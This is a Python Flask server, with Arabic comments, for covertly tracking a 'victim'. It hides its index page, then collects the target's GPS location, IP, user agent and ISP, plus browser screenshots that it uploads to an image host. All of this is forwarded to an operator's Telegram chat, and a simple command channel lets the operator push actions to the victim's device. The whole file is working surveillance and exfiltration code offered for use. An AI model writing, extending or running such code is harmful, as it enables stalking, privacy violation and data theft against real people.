from flask import Flask, request, render_template, jsonify
import requests, base64, os, datetime
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, IMGBB_API_KEY

app = Flask(__name__)
latest_command = None
history_log = []

# 🛰️ إرسال تليقرام
def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    requests.post(url, data=data)

@app.route('/')
def index():
    return "", 204  # ما يظهر أي شيء للضحية

@app.route('/map')  # واجهة المطوّر فقط
def show_map():
    return render_template('map.html', logs=history_log)

@app.route('/notify', methods=['POST'])
def notify():
    data = request.get_json()
    send_telegram(data['message'])
    return 'OK'

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    lat, lon, acc = data.get('latitude'), data.get('longitude'), data.get('accuracy')
    if not lat or not lon:
        send_telegram("❌ رفض الوصول للموقع.")
        return 'OK'

    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg = f"""📍 <b>موقع الضحية</b>
⏰ {timestamp}
🌍 الدولة: جاري التحديد...
🧭 الإحداثيات: {lat}, {lon}
🎯 الدقة: {acc} متر
🔗 <a href="{maps_link}">عرض على الخريطة</a>"""
    history_log.append({'lat': lat, 'lon': lon, 'time': timestamp})
    send_telegram(msg)
    return 'OK'

@app.route('/fingerprint', methods=['POST'])
def fingerprint():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'غير معروف')

    try:
        ipinfo = requests.get("https://ipapi.co/json/").json()
        isp = ipinfo.get("org", "غير معروف")
        city = ipinfo.get("city", "?")
        country = ipinfo.get("country_name", "?")
    except:
        isp, city, country = "?", "?", "?"

    msg = f"""🧠 <b>معلومات الجهاز</b>
🌍 الدولة: {country}
🏙️ المدينة: {city}
💼 المزود: {isp}
🖥️ الجهاز: {ua}
🌐 IP: {ip}"""
    send_telegram(msg)
    return 'OK'

@app.route('/screenshot', methods=['POST'])
def screenshot():
    try:
        data_url = request.get_data().decode('utf-8')
        _, encoded = data_url.split(',', 1)
        binary_data = base64.b64decode(encoded)

        with open("temp.png", "wb") as f:
            f.write(binary_data)

        with open("temp.png", "rb") as f:
            res = requests.post("https://api.imgbb.com/1/upload", data={"key": IMGBB_API_KEY}, files={"image": f})

        img_url = res.json()['data']['url']
        send_telegram(f"📸 <b>لقطة من الجهاز</b>\n<a href='{img_url}'>رابط الصورة</a>")
    except Exception as e:
        send_telegram(f"❌ فشل رفع الصورة: {str(e)}")
    finally:
        if os.path.exists("temp.png"):
            os.remove("temp.png")
    return 'OK'

@app.route('/get_command', methods=['GET'])
def get_command():
    global latest_command
    cmd = latest_command
    latest_command = None
    return jsonify({'command': cmd})

@app.route('/trigger/<action>', methods=['POST'])
def trigger_action(action):
    global latest_command
    latest_command = action
    send_telegram(f"📡 <b>تم إرسال أمر:</b> {action}")
    return 'OK'

if __name__ == '__main__':
    app.run(debug=True)
